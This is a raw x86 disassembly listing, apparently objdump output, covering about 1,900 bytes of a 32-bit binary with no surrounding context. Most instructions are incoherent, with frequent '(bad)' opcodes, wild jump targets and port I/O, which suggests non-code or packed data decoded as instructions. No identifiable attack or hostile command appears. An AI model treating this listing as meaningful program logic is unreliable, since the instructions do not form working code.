  40afa9:	lock or ebp,DWORD PTR ss:[eax+0x1247fdee]
  40afb1:	and    DWORD PTR [ebx-0x14],edx
  40afb4:	ret    
  40afb5:	jbe    0x40b00f
  40afb7:	add    BYTE PTR [esi-0x54],al
  40afba:	(bad)  
  40afbb:	push   edx
  40afbc:	xchg   edi,eax
  40afbd:	and    eax,0x4a360454
  40afc2:	add    DWORD PTR [eax],edx
  40afc4:	test   eax,0x26577f76
  40afc9:	dec    esp
  40afca:	test   al,0x19
  40afcc:	inc    edx
  40afcd:	outs   dx,DWORD PTR ds:[esi]
  40afce:	int3   
  40afcf:	ret    0xcb01
  40afd2:	lods   eax,DWORD PTR ds:[esi]
  40afd3:	add    cl,ch
  40afd5:	cwde   
  40afd6:	rcr    BYTE PTR [ebp+0x0],0xd7
  40afda:	sbb    eax,edx
  40afdc:	add    al,0x1c
  40afde:	dec    esi
  40afdf:	ror    BYTE PTR [ebx+0x10e8c15d],0x31
  40afe6:	add    DWORD PTR [eax],eax
  40afe8:	(bad)  
  40afe9:	fmul   st(5),st
  40afeb:	ror    BYTE PTR [ebx+0xe0802d],0xcb
  40aff2:	add    BYTE PTR [eax],al
  40aff4:	rol    DWORD PTR [eax],0x0
  40aff7:	add    BYTE PTR [eax],al
  40aff9:	add    BYTE PTR [ebp+0x1dd109d0],ch
  40afff:	test   eax,0xc8bec106
  40b004:	or     edx,eax
  40b006:	unpcklps xmm1,XMMWORD PTR [ebx-0x28b0a014]
  40b00d:	mov    esp,DWORD PTR [edi+0xbffcda8]
  40b013:	mov    dl,0x3b
  40b015:	inc    ebp
  40b016:	pop    esi
  40b017:	inc    edi
  40b018:	push   eax
  40b019:	je     0x40afae
  40b01b:	cmc    
  40b01c:	mov    edi,0xffffa0e9
  40b021:	jmp    DWORD PTR [edx+0xb]
  40b024:	mov    edi,DWORD PTR [ebp-0x6c]
  40b027:	or     bl,BYTE PTR cs:[ecx+0x17]
  40b02b:	mov    dh,0xf1
  40b02d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b02e:	out    0xe,eax
  40b030:	add    al,0xe8
  40b032:	stc    
  40b033:	mov    dl,0xfd
  40b035:	call   edi
  40b037:	xor    al,0x8
  40b039:	mov    DWORD PTR [edx],edx
  40b03b:	add    al,0x8b
  40b03d:	dec    ebx
  40b03e:	inc    esp
  40b03f:	test   al,0x9d
  40b041:	dec    DWORD PTR [ebx+0x544687b2]
  40b047:	add    esi,DWORD PTR [edi-0x2fb0e7b5]
  40b04d:	rol    DWORD PTR [esi+0x24e1bfc7],0x78
  40b054:	std    
  40b055:	add    BYTE PTR [ebp-0x27],dh
  40b058:	add    ah,BYTE PTR [ebx]
  40b05a:	inc    ebp
  40b05b:	loope  0x40b00e
  40b05d:	add    BYTE PTR gs:[eax],al
  40b060:	add    BYTE PTR [eax],al
  40b062:	add    ah,bh
  40b064:	imul   edi,esi,0xe
  40b067:	ret    0xf290
  40b06a:	mov    ah,BYTE PTR [ebx+ebx*1]
  40b06d:	fld    QWORD PTR [edi]
  40b06f:	push   esi
  40b070:	jmp    0xd0be9136
  40b075:	mov    bl,0x65
  40b077:	cld    
  40b078:	adc    esi,esp
  40b07a:	push   cs
  40b07b:	sub    ah,BYTE PTR [ecx]
  40b07d:	repnz mov al,ah
  40b080:	call   0xe0c4:0x699607d9
  40b087:	jge    0x40b059
  40b089:	mov    bl,0x65
  40b08b:	in     al,dx
  40b08c:	jmp    0x40b07f
  40b08e:	push   cs
  40b08f:	add    ah,BYTE PTR [ecx]
  40b091:	clc    
  40b092:	mov    al,ah
  40b094:	call   0xe0c4:0x895607d9
  40b09b:	ins    DWORD PTR es:[edi],dx
  40b09c:	loopne 0x40b051
  40b09e:	gs in  al,dx
  40b0a0:	adc    edi,eax
  40b0a2:	push   cs
  40b0a3:	retf   0xf610
  40b0a6:	mov    ah,BYTE PTR [edx+ebx*4+0x695607d9]
  40b0ad:	(bad)  
  40b0ae:	loopne 0x40b11d
  40b0b0:	loopne 0x40b065
  40b0b2:	gs cld 
  40b0b4:	mov    dh,ah
  40b0b6:	push   cs
  40b0b7:	and    dl,BYTE PTR [eax+0x1a448aea]
  40b0bd:	fiadd  DWORD PTR [edi]
  40b0bf:	xchg   esi,eax
  40b0c0:	or     ebp,eax
  40b0c2:	loopne 0x40b141
  40b0c4:	shl    BYTE PTR [ebx+0x65],1
  40b0ca:	add    BYTE PTR [eax],al
  40b0cc:	cld    
  40b0cd:	jb     0x40b0b9
  40b0cf:	push   cs
  40b0d0:	or     ah,BYTE PTR [eax+0x1a248ae8]
  40b0d6:	fiadd  DWORD PTR [edi]
  40b0d8:	push   esi
  40b0d9:	add    bh,BYTE PTR [ecx]
  40b0db:	lds    edx,FWORD PTR ds:0x98b4f1fa
  40b0e1:	jns    0x40b0a1
  40b0e3:	jmp    0xefe24453
  40b0e8:	jmp    FWORD PTR [esi*8+0x12c1257a]
  40b0ef:	cld    
  40b0f0:	push   edi
  40b0f1:	mov    dl,0x27
  40b0f3:	in     eax,0x72
  40b0f5:	not    DWORD PTR [edi]
  40b0f7:	data16 cld 
  40b0f9:	xor    eax,DWORD PTR ds:0xe55cf89
  40b0ff:	jnp    0x40b162
  40b101:	repnz inc edx
  40b103:	sti    
  40b104:	cmp    eax,0x19d2d977
  40b109:	ja     0x40b0fc
  40b10b:	fld    TBYTE PTR [ebx-0x10314235]
  40b111:	push   esp
  40b112:	fnstcw WORD PTR [eax+esi*2+0x77]
  40b116:	and    DWORD PTR [eax],ecx
  40b118:	popf   
  40b119:	scas   eax,DWORD PTR es:[edi]
  40b11a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b11b:	into   
  40b11c:	stos   DWORD PTR es:[edi],eax
  40b11d:	js     0x40b145
  40b11f:	or     dh,ch
  40b121:	ss rcr ebx,0xb3
  40b125:	retf   
  40b126:	(bad)  
  40b127:	into   
  40b128:	std    
  40b129:	inc    ebx
  40b12a:	sar    DWORD PTR [edx+0x1],1
  40b12d:	cli    
  40b12e:	sbb    eax,0x7b
  40b133:	add    BYTE PTR [eax],al
  40b135:	mov    eax,0xb731122b
  40b13a:	std    
  40b13b:	call   0x6817af78
  40b140:	fist   WORD PTR [esi-0x34fc16fc]
  40b146:	ja     0x40b0e3
  40b148:	jecxz  0x40b1a3
  40b14a:	retf   0xdb4d
  40b14d:	push   0xf803e878
  40b152:	jg     0x40b198
  40b154:	rol    BYTE PTR [ebx-0x36],1
  40b157:	call   FWORD PTR [eax-0x900a064]
  40b15d:	dec    esi
  40b15e:	fimul  WORD PTR [ecx]
  40b160:	call   0x61002fdb
  40b165:	inc    eax
  40b166:	add    eax,DWORD PTR [eax]
  40b168:	jmp    0xe2b5710c
  40b16d:	cmp    dl,cl
  40b16f:	(bad)  
  40b170:	test   eax,0xbbf94f49
  40b175:	fld    QWORD PTR ss:[ebx+0x2f]
  40b179:	jbe    0x40b17d
  40b17b:	inc    eax
  40b17c:	mov    al,ds:0x9ce7cb4d
  40b181:	jae    0x40b187
  40b183:	add    BYTE PTR [ebx-0x23],dl
  40b186:	loope  0x40b135
  40b188:	out    dx,eax
  40b189:	je     0x40b18d
  40b18b:	push   eax
  40b18c:	inc    ebx
  40b18d:	pop    ebx
  40b18e:	leave  
  40b18f:	sar    DWORD PTR ss:[esi-0x4],1
  40b193:	add    cl,ch
  40b195:	cli    
  40b196:	mov    DWORD PTR [ebx-0x6e],esi
  40b199:	add    BYTE PTR [eax],al
  40b19b:	add    BYTE PTR [eax],al
  40b19d:	add    BYTE PTR [edx],bh
  40b19f:	ds aam 0x19
  40b1a2:	shl    DWORD PTR [ebx],1
  40b1a4:	adc    ecx,ebp
  40b1a6:	jbe    0x40b208
  40b1a8:	sbb    DWORD PTR [ebx*8+0x1bf872c9],0x3e
  40b1b0:	aam    0x39
  40b1b2:	das    
  40b1b3:	popa   
  40b1b4:	(bad)  
  40b1b5:	mov    esi,0xe80971ae
  40b1ba:	jbe    0x40b23a
  40b1bc:	mov    edi,0x99ecfd
  40b1c1:	ucomiss xmm0,xmm4
  40b1c4:	push   esp
  40b1c5:	jb     0x40b21c
  40b1c7:	sub    bl,0x51
  40b1ca:	jns    0x40b1ce
  40b1cc:	add    BYTE PTR [edi-0x5e811d7],bh
  40b1d2:	mov    dh,0x2
  40b1d4:	mov    eax,DWORD PTR [eax]
  40b1d6:	mov    WORD PTR [ecx+0x44],cs
  40b1d9:	hlt    
  40b1da:	fdivr  QWORD PTR [ebp+0x554f443]
  40b1e0:	add    BYTE PTR [eax],al
  40b1e2:	arpl   cx,dx
  40b1e4:	mov    edx,0x8504dc14
  40b1e9:	ror    BYTE PTR [eax],0x0
  40b1ec:	mov    eax,esi
  40b1ee:	aaa    
  40b1ef:	inc    eax
  40b1f0:	clc    
  40b1f1:	mov    ecx,ebx
  40b1f3:	mov    esp,0x49794587
  40b1f8:	inc    esp
  40b1f9:	rcr    ah,1
  40b1fb:	mov    esi,0x4c0de043
  40b200:	je     0x40b1e3
  40b202:	add    BYTE PTR [eax],al
  40b204:	add    BYTE PTR [eax],al
  40b206:	add    bl,ah
  40b208:	iret   
  40b209:	ret    0x9c11
  40b20c:	dec    BYTE PTR [ebp+eax*2+0x64e8151c]
  40b213:	jecxz  0x40b217
  40b215:	add    BYTE PTR [ecx-0x7a745267],cl
  40b21b:	shl    BYTE PTR [ebp-0x48a30003],1
  40b221:	adc    eax,eax
  40b223:	popf   
  40b224:	inc    esp
  40b225:	add    BYTE PTR [ebx-0x226e7],cl
  40b22b:	shr    DWORD PTR [ecx],cl
  40b22d:	rol    ah,0x25
  40b230:	inc    eax
  40b231:	in     eax,dx
  40b232:	push   0xffffff9d
  40b234:	inc    edi
  40b235:	inc    esp
  40b236:	loopne 0x40b284
  40b238:	dec    ebx
  40b239:	inc    esp
  40b23a:	or     BYTE PTR [esi+0x2b],ah
  40b23d:	push   DWORD PTR [eax]
  40b23f:	in     al,0x4f
  40b241:	or     BYTE PTR [ecx],al
  40b243:	mov    WORD PTR [esi],ss
  40b245:	leave  
  40b246:	ret    0x458
  40b249:	push   ebp
  40b24a:	mov    eax,eax
  40b24c:	sub    dl,0x10
  40b24f:	sub    ebp,DWORD PTR [edx]
  40b251:	and    DWORD PTR [edx+0x75],ebp
  40b254:	fnstenv [edi+edi*8]
  40b257:	push   0x753ff489
  40b25c:	pop    esp
  40b25d:	(bad)  
  40b25e:	or     ecx,edi
  40b260:	stc    
  40b261:	sub    esp,DWORD PTR [esi-0x14]
  40b264:	xchg   edi,eax
  40b265:	add    DWORD PTR [ebp-0x39ccf648],ecx
  40b26b:	add    BYTE PTR [eax],al
  40b26d:	add    BYTE PTR [eax],al
  40b26f:	add    BYTE PTR [ebx-0x26],dh
  40b272:	(bad)  
  40b274:	test   ecx,ebx
  40b276:	add    ah,BYTE PTR [esi-0x12]
  40b279:	xchg   esi,eax
  40b27a:	shl    BYTE PTR [ebp-0x4],cl
  40b27d:	lahf   
  40b27e:	add    eax,0xd096fe66
  40b283:	gs in  al,dx
  40b285:	lahf   
  40b286:	add    ecx,DWORD PTR [ebp-0x17ce3250]
  40b28c:	add    eax,0x2a0002ae
  40b291:	loope  0x40b25d
  40b293:	jmp    edx
  40b295:	pop    esi
  40b296:	les    esi,FWORD PTR [ebx-0x79]
  40b299:	fs cmp esp,edi
  40b29c:	mov    gs,WORD PTR [eax-0x6]
  40b29f:	inc    esi
  40b2a0:	mov    edx,0x338961e9
  40b2a5:	rcr    dl,cl
  40b2a7:	les    ebx,FWORD PTR [ecx+0x388d02da]
  40b2ad:	xchg   ebp,eax
  40b2ae:	xor    ebp,eax
  40b2b0:	mov    esi,0xf80002cc
  40b2b5:	cdq    
  40b2b6:	dec    edi
  40b2b7:	adc    ch,dh
  40b2b9:	push   ds
  40b2ba:	enter  0xc23a,0xa8
  40b2be:	inc    ecx
  40b2bf:	iret   
  40b2c0:	and    eax,0x6e4d7cf7
  40b2c5:	jno    0x40b268
  40b2c7:	(bad)  [ecx+ebx*8+0x77]
  40b2cb:	inc    esp
  40b2cc:	jno    0x40b2b7
  40b2ce:	fist   DWORD PTR [edx]
  40b2d0:	xchg   BYTE PTR [edx],al
  40b2d2:	jmp    0x40b2da
  40b2d7:	add    BYTE PTR [eax],al
  40b2d9:	clc    
  40b2da:	rcl    esp,0xf4
  40b2dd:	popf   
  40b2de:	inc    ebp
  40b2df:	push   ebp
  40b2e0:	xor    al,0x82
  40b2e2:	inc    eax
  40b2e3:	int3   
  40b2e4:	(bad)  
  40b2e5:	sar    BYTE PTR [ecx-0x3a],1
  40b2e8:	clc    
  40b2e9:	pop    edx
  40b2ea:	jp     0x40b308
  40b2ec:	add    eax,0xc7ab7575
  40b2f1:	ret    0x515a
  40b2f4:	add    al,0x75
  40b2f6:	add    dl,BYTE PTR [ecx]
  40b2f8:	push   eax
  40b2f9:	jae    0x40b2fd
  40b2fb:	jmp    0x9d02a32a
  40b300:	hlt    
  40b301:	test   DWORD PTR [ebp+ecx*1+0x14],0x868efd87
  40b309:	mov    al,0x3
  40b30b:	call   0x159ec043
  40b310:	add    eax,0x3129b975
  40b315:	(bad)  
  40b316:	aad    0x67
  40b318:	xlat   BYTE PTR ds:[ebx]
  40b319:	dec    edx
  40b31a:	add    al,0xe9
  40b31c:	add    eax,DWORD PTR [esi+0x30]
  40b31f:	ds (bad) 
  40b321:	jbe    0x40b324
  40b323:	jmp    0x6bb5d92b
  40b328:	xchg   edi,eax
  40b329:	rol    esi,0xbd
  40b32c:	xor    ecx,DWORD PTR [edi+0x2]
  40b32f:	mov    dh,0xf0
  40b331:	call   0x3904:0xfe0428f3
  40b338:	repnz bound eax,QWORD PTR [edx]
  40b33b:	jo     0x40b37d
  40b33d:	add    BYTE PTR [eax],al
  40b33f:	add    BYTE PTR [eax],al
  40b341:	add    BYTE PTR [ebp+0x664fa87c],bl
  40b347:	jne    0x40b3a4
  40b349:	xchg   edi,eax
  40b34a:	mov    esi,eax
  40b34c:	test   DWORD PTR [eax+esi*8],esi
  40b34f:	dec    esp
  40b350:	xchg   ebp,eax
  40b351:	fcmovne st,st(4)
  40b353:	mov    ch,0xff
  40b355:	out    0x76,eax
  40b357:	jle    0x40b318
  40b359:	hlt    
  40b35a:	ins    DWORD PTR es:[edi],dx
  40b35b:	pop    esp
  40b35c:	or     al,0x74
  40b35e:	mov    ch,0xae
  40b360:	imul   ebp,ecx,0x6ad6c5a6
  40b366:	adc    bh,dl
  40b368:	(bad)  
  40b369:	hlt    
  40b36a:	jbe    0x40b35d
  40b36c:	aas    
  40b36d:	jmp    0x3e968935
  40b372:	inc    ebp
  40b373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b374:	adc    DWORD PTR [ecx-0x17fd748a],ebp
  40b37a:	jbe    0x40b37e
  40b37c:	cmp    ebp,DWORD PTR [eax]
  40b37e:	fs ja  0x40b3f5
  40b381:	or     eax,0x1c1371f
  40b386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b387:	mov    dh,0x0
  40b389:	jmp    0xf5b53918
  40b38e:	mov    al,ds:0x98278af6
  40b393:	add    dl,BYTE PTR [eax-0xa]
  40b396:	and    al,0x81
  40b398:	ret    
  40b399:	(bad)  [ebp+0x3e]
  40b39c:	clc    
  40b39d:	cmp    DWORD PTR [edx+0x7e],ebp
  40b3a0:	stos   DWORD PTR es:[edi],eax
  40b3a1:	fsubr  QWORD PTR [esp+eax*8+0x434f]
  40b3a8:	add    BYTE PTR [eax],al
  40b3aa:	add    BYTE PTR [ebx+0x7b],bh
  40b3ad:	pop    esp
  40b3ae:	sar    DWORD PTR [esi+ebp*8+0x236dacf],1
  40b3b5:	test   BYTE PTR [ecx+0x6c8cec25],ch
  40b3bb:	or     eax,0x61aefec7
  40b3c0:	jns    0x40b406
  40b3c2:	mov    eax,ds:0x91e04e2a
  40b3c7:	push   0x12e900b6
  40b3cc:	test   DWORD PTR [esp+ebx*8+0x28],esi
  40b3d0:	test   BYTE PTR [eax+eax*1+0x68de51],0x5c
  40b3d8:	mov    ebx,0xca2083d5
  40b3dd:	mov    eax,DWORD PTR [ebp+0x8]
  40b3e0:	push   cs
  40b3e1:	lea    eax,[ebp-0x70]
  40b3e4:	push   cs
  40b3e5:	lea    eax,[ebp-0x8]
  40b3e8:	or     eax,0xdf0458d
  40b3ed:	push   0xffffffff
  40b3ef:	mov    ebx,0xc12ead5
  40b3f4:	add    DWORD PTR [ebp+0x31c501c0],eax
  40b3fa:	div    BYTE PTR [edi-0x5fba74df]
  40b400:	inc    edi
  40b401:	dec    esp
  40b402:	mov    eax,0x50106
  40b407:	mov    ecx,es
  40b409:	sub    BYTE PTR [eax-0x64],ch
  40b40c:	push   eax
  40b40d:	xchg   edi,eax
  40b40e:	add    BYTE PTR [eax],al
  40b410:	add    BYTE PTR [eax],al
  40b412:	add    BYTE PTR [eax],al
  40b414:	popf   
  40b415:	xchg   ecx,eax
  40b416:	pop    ds
  40b417:	dec    esi
  40b418:	out    dx,al
  40b419:	mov    edx,0x3b64504f
  40b41e:	into   
  40b41f:	add    bl,ah
  40b421:	inc    ebp
  40b422:	out    dx,eax
  40b423:	mov    ecx,DWORD PTR [ecx]
  40b425:	test   eax,0x45c04d01
  40b42a:	inc    esp
  40b42b:	fmul   QWORD PTR [ecx+0x1d]
  40b42e:	add    DWORD PTR [edx],edx
  40b430:	push   ebp
  40b431:	sbb    al,0xf8
  40b433:	test   DWORD PTR [edi],eax
  40b435:	xor    al,0x7
  40b437:	xor    edi,DWORD PTR [ebx-0x33ff7a59]
  40b43d:	add    BYTE PTR [ebx-0x26364b3d],cl
  40b443:	add    DWORD PTR [ebp+eax*2+0x34db85f7],ebx
  40b44a:	jp     0x40b412
  40b44c:	xchg   ebx,eax
  40b44d:	jmp    DWORD PTR [eax+0x43797594]
  40b453:	add    ah,bh
  40b455:	sbb    eax,DWORD PTR [ebx]
  40b457:	mov    al,ds:0x4378e5
  40b45c:	call   0xbac8aa44
  40b461:	(bad)  
  40b462:	(bad)  
  40b463:	adc    al,0x4d
  40b465:	test   al,0x42
  40b467:	add    bl,bl
  40b469:	push   edx
  40b46a:	inc    eax
  40b46b:	push   es
  40b46c:	in     al,dx
  40b46d:	lods   al,BYTE PTR ds:[esi]
  40b46e:	cli    
  40b46f:	gs (bad) 
  40b471:	xchg   esi,eax
  40b472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b473:	mov    al,BYTE PTR [eax+0x3ff065]
  40b479:	add    BYTE PTR [eax],al
  40b47b:	add    BYTE PTR [eax],al
  40b47d:	jne    0x40b432
  40b47f:	jns    0x40b4c7
  40b481:	imul   edi,DWORD PTR [ebx-0x4bd6bb85],0xbb7b4679
  40b48b:	jnp    0x40b4d1
  40b48d:	or     eax,0x85467974
  40b492:	aam    0x8f
  40b494:	inc    esi
  40b495:	or     DWORD PTR [ecx-0x76de8b39],0x472d5c7
  40b49f:	inc    eax
  40b4a0:	or     al,0x76
  40b4a2:	and    eax,edi
  40b4a4:	mov    dh,0x3a
  40b4a6:	fild   DWORD PTR [ebx-0x3896863d]
  40b4ac:	je     0x40b47f
  40b4ae:	or     bh,al
  40b4b0:	aad    0x6a
  40b4b2:	ins    BYTE PTR es:[edi],dx
  40b4b3:	ds adc dh,dh
  40b4b6:	xchg   ebp,eax
  40b4b7:	test   DWORD PTR [edi+0x7a],0xc20e3e6c
  40b4be:	push   es
  40b4bf:	in     al,0x2
  40b4c1:	mov    dh,0xe9
  40b4c3:	(bad)  
  40b4c4:	aad    0xfe
  40b4c6:	out    dx,al
  40b4c7:	retf   
  40b4c8:	xor    BYTE PTR [ecx-0x368b885b],0x2
  40b4cf:	xchg   ecx,eax
  40b4d0:	pop    ss
  40b4d1:	scas   al,BYTE PTR es:[edi]
  40b4d2:	add    ecx,ebp
  40b4d4:	js     0x40b4df
  40b4d6:	(bad)  
  40b4d7:	sbb    BYTE PTR [edi],0xbe
  40b4da:	add    ecx,ebp
  40b4dc:	js     0x40b4e7
  40b4de:	loop   0x40b470
  40b4e0:	out    0x0,eax
  40b4e2:	add    BYTE PTR [eax],al
  40b4e4:	add    BYTE PTR [eax],al
  40b4e6:	scas   eax,DWORD PTR es:[edi]
  40b4e7:	add    ecx,ebp
  40b4e9:	jp     0x40b4a4
  40b4eb:	cli    
  40b4ec:	pop    edi
  40b4ed:	in     al,dx
  40b4ee:	(bad)  
  40b4ef:	mov    edx,0xb9be260d
  40b4f4:	sub    al,BYTE PTR [eax]
  40b4f6:	jne    0x40b527
  40b4f8:	mov    ah,0x2e
  40b4fa:	cmp    edi,esp
  40b4fc:	out    0xdb,eax
  40b4fe:	xor    eax,0xee03eaea
  40b503:	adc    al,0xe1
  40b505:	icebp  
  40b506:	jp     0x40b50a
  40b508:	cli    
  40b509:	stos   BYTE PTR es:[edi],al
  40b50a:	cli    
  40b50b:	cmp    ebp,eax
  40b50d:	xchg   BYTE PTR [edx-0x5c],dh
  40b510:	test   eax,0x20e55d03
  40b515:	test   eax,0x1b9402b7
  40b51a:	stos   BYTE PTR es:[edi],al
  40b51b:	ret    
  40b51c:	cmp    ecx,DWORD PTR [eax+ebp*2]
  40b51f:	retf   0x432b
  40b522:	jne    0x40b571
  40b524:	(bad)  
  40b526:	inc    esp
  40b527:	jmp    0x40b513
  40b529:	add    edi,ecx
  40b52b:	sar    DWORD PTR [eax+edi*8-0x3],0xe4
  40b530:	in     al,dx
  40b531:	test   al,0x37
  40b533:	add    ch,BYTE PTR [edi+0x29a4dd00]
  40b539:	add    al,0x74
  40b53b:	sub    edx,esi
  40b53d:	lock outs dx,BYTE PTR ds:[esi]
  40b53f:	lock sub BYTE PTR [ebx+ebx*2],al
  40b543:	mov    eax,ds:0x237a9ba
  40b548:	inc    edi
  40b549:	jge    0x40b54b
  40b54b:	add    BYTE PTR [eax],al
  40b54d:	add    BYTE PTR [eax],al
  40b54f:	cmp    BYTE PTR [eax],al
  40b551:	add    cl,al
  40b553:	clc    
  40b554:	jmp    0xe104:0x3d1ee901
  40b55b:	(bad)  
  40b55c:	retf   0x2adc
  40b55f:	jns    0x40b5ae
  40b561:	sub    BYTE PTR [esi],bh
  40b563:	mov    dl,0xad
  40b565:	aaa    
  40b566:	in     al,dx
  40b567:	scas   al,BYTE PTR es:[edi]
  40b568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b569:	inc    edx
  40b56a:	jmp    0x7a28a194
  40b56f:	pusha  
  40b570:	add    al,0x0
  40b572:	ins    DWORD PTR es:[edi],dx
  40b573:	ss ss or eax,0xdcbe4d60
  40b57a:	stos   BYTE PTR es:[edi],al
  40b57b:	jbe    0x40b545
  40b57d:	add    al,0x61
  40b57f:	sbb    eax,0x9be80045
  40b584:	rcl    DWORD PTR [ebp*8-0x30fffdbc],0x11
  40b58c:	mov    eax,0x2876aad9
  40b591:	mov    DWORD PTR [edi-0x2e48558b],ebp
  40b597:	je     0x40b59b
  40b599:	mov    DWORD PTR [edi+0x1514c11b],ebp
  40b59f:	add    al,0x2
  40b5a1:	add    BYTE PTR [esi-0x5876d7a3],dh
  40b5a7:	call   FWORD PTR [ebx+eax*8-0x64]
  40b5ab:	jg     0x40b55a
  40b5ad:	add    BYTE PTR ds:0x5deb82be,0x0
  40b5b4:	add    BYTE PTR [eax],al
  40b5b6:	add    BYTE PTR [eax],al
  40b5b8:	je     0x40b5bc
  40b5ba:	add    BYTE PTR [edx-0x300a670],bl
  40b5c0:	(bad)  
  40b5c1:	adc    eax,DWORD PTR [eax-0x17]
  40b5c4:	fisttp QWORD PTR gs:[eax+0x3af6952d]
  40b5cb:	stos   BYTE PTR es:[edi],al
  40b5cc:	xor    cl,BYTE PTR [ecx]
  40b5ce:	xor    eax,DWORD PTR [eax]
  40b5d0:	or     al,0xde
  40b5d2:	cmp    DWORD PTR [edx],eax
  40b5d4:	pushf  
  40b5d5:	add    eax,0x59dda68
  40b5da:	add    BYTE PTR [edx-0x6c],ch
  40b5dd:	(bad)  
  40b5de:	xor    ebx,eax
  40b5e0:	fiadd  DWORD PTR [ebx+0x0]
  40b5e3:	(bad)  
  40b5e4:	pop    eax
  40b5e5:	loop   0x40b606
  40b5e7:	add    bl,BYTE PTR [ebp+eax*1+0x2189ff00]
  40b5ee:	adc    DWORD PTR [eax-0x74],eax
  40b5f1:	cmp    dh,bh
  40b5f3:	cmp    esi,edi
  40b5f5:	push   ecx
  40b5f6:	fmul   DWORD PTR [ebp+0x8fe2d8]
  40b5fc:	dec    esp
  40b5fd:	add    eax,0x5d1f5350
  40b602:	and    al,0x60
  40b604:	pop    esp
  40b605:	add    eax,0x45bc653
  40b60a:	mov    DWORD PTR [eax+edi*2+0x1a],ebx
  40b60e:	call   DWORD PTR ds:0x3eb214
  40b614:	cdq    
  40b615:	(bad)  
  40b616:	jae    0x40b62a
  40b618:	xchg   ecx,eax
  40b619:	and    BYTE PTR [edx],0x90
  40b61c:	add    BYTE PTR [eax],al
  40b61e:	add    BYTE PTR [eax],al
  40b620:	add    BYTE PTR [eax*1-0x4eacb000],cl
  40b627:	(bad)  
  40b628:	adc    ebx,esp
  40b62a:	add    al,0x89
  40b62c:	inc    esp
  40b62d:	cmp    BYTE PTR [ebp+0x44dfd066],ch
  40b633:	add    BYTE PTR [ebp+0x502220c8],cl
  40b639:	repz scas eax,DWORD PTR es:[edi]
  40b63b:	into   
  40b63c:	adc    bl,BYTE PTR [eax*1-0x3478b73]
  40b643:	mov    bh,0x9c
  40b645:	int3   
  40b646:	add    al,0x0
  40b648:	call   0x419c46
  40b64d:	jne    0x40b673
  40b64f:	mov    ebp,0x200739c5
  40b654:	add    DWORD PTR [edx+0x56281fee],esi
  40b65a:	stos   DWORD PTR es:[edi],eax
  40b65b:	add    al,BYTE PTR [eax]
  40b65d:	cld    
  40b65e:	out    dx,al
  40b65f:	pop    ds
  40b660:	sub    al,0xec
  40b662:	push   cs
  40b663:	and    BYTE PTR [eax],dh
  40b665:	in     eax,dx
  40b666:	inc    esi
  40b667:	and    BYTE PTR [edi],cl
  40b669:	cld    
  40b66a:	(bad)  
  40b66b:	pop    ds
  40b66c:	adc    dh,bh
  40b66e:	out    0x1f,al
  40b670:	adc    BYTE PTR [esi+0x6b],al
  40b673:	inc    edx
  40b674:	rcl    DWORD PTR [ebp-0x56dbc0d3],cl
  40b67a:	mov    al,0x7e
  40b67c:	push   0x8b02a974
  40b681:	mov    ecx,0xfdeec5
  40b686:	add    BYTE PTR [eax],al
  40b688:	add    BYTE PTR [eax],al
  40b68a:	mov    dl,0xaa
  40b68c:	jg     0x40b6d1
  40b68e:	cdq    
  40b68f:	mov    ch,0xf0
  40b691:	mov    WORD PTR [ecx-0x66bc8750],es
  40b697:	loopne 0x40b713
  40b699:	add    eax,0x65c33f6a
  40b69e:	imul   cl
  40b6a0:	inc    ecx
  40b6a1:	data16 cld 
  40b6a3:	ins    DWORD PTR es:[edi],dx
  40b6a4:	push   ds
  40b6a5:	sbb    al,0xf0
  40b6a7:	gs push ds
  40b6a9:	sbb    al,0xc5
  40b6ab:	out    dx,eax
  40b6ac:	ds and al,0x64
  40b6af:	test   eax,0xbc0d14c3
  40b6b4:	inc    edx
  40b6b5:	add    BYTE PTR [ebp+0x3783f361],ch
  40b6bb:	stos   BYTE PTR es:[edi],al
  40b6bc:	add    al,BYTE PTR [eax]
  40b6be:	cmp    eax,0x75b07eb0
  40b6c3:	test   eax,0x25724802
  40b6c8:	mov    al,ds:0xe902daff
  40b6cd:	dec    ebx
  40b6ce:	add    BYTE PTR [esi+0x2750473],0x21
  40b6d5:	adc    edi,eax
  40b6d7:	imul   ebp,eax,0x3
  40b6da:	jne    0x40b6a4
  40b6dc:	sub    al,0xe8
  40b6de:	add    DWORD PTR ds:0x46b30579,0x8675120d
  40b6e8:	test   al,0x13
  40b6ea:	icebp  
  40b6eb:	test   al,0xe8
  40b6ed:	add    eax,DWORD PTR [eax]
  40b6ef:	add    BYTE PTR [eax],al
  40b6f1:	add    BYTE PTR [eax],al
  40b6f3:	jne    0x40b71f
  40b6f5:	in     al,0x4
  40b6f7:	jne    0x40b6fb
  40b6f9:	mov    BYTE PTR fs:[esi-0x6a],dl
  40b6fd:	call   0x1a932c05
  40b702:	push   edi
  40b703:	(bad)  
  40b704:	push   ebx
  40b705:	sbb    dl,BYTE PTR [ecx+0x53b0e6b6]
  40b70b:	bound  edx,QWORD PTR ds:0x2b5169d
  40b711:	ins    BYTE PTR es:[edi],dx
  40b712:	les    eax,FWORD PTR [ebx+0x75047186]
  40b718:	add    bl,BYTE PTR [edx]
  40b71a:	(bad)  
  40b71b:	fmul   DWORD PTR [ecx+0x3e2e864]
  40b721:	jmp    0x4c6b729
  40b726:	xchg   esp,eax
  40b727:	sub    bh,BYTE PTR [edi+0x152253e8]
  40b72d:	sub    DWORD PTR [eax],ebx
  40b72f:	mov    ch,0x2
  40b731:	jo     0x40b793
  40b733:	pop    ecx
  40b734:	repnz fcmovu st,st(6)
  40b737:	stc    
  40b738:	inc    ebp
  40b739:	int    0xe7
  40b73b:	sbb    ah,BYTE PTR [eax]
  40b73d:	out    0x3,al
  40b73f:	jne    0x40b6c6
  40b741:	sub    BYTE PTR [eax],bh
  40b743:	push   ebx
  40b744:	push   edx
  40b745:	ins    BYTE PTR es:[edi],dx
  40b746:	mov    BYTE PTR [esi+0x76e8ff96],dl
  40b74c:	add    dl,BYTE PTR [eax-0x12]
  40b74f:	jge    0x40b6f7
  40b751:	adc    DWORD PTR [ecx],ebp
  40b753:	jns    0x40b6da
  40b755:	mov    edi,0x54
  40b75a:	add    BYTE PTR [eax],al
  40b75c:	ds xchg dl,bl
  40b75f:	pop    ebp
  40b760:	ja     0x40b6e4
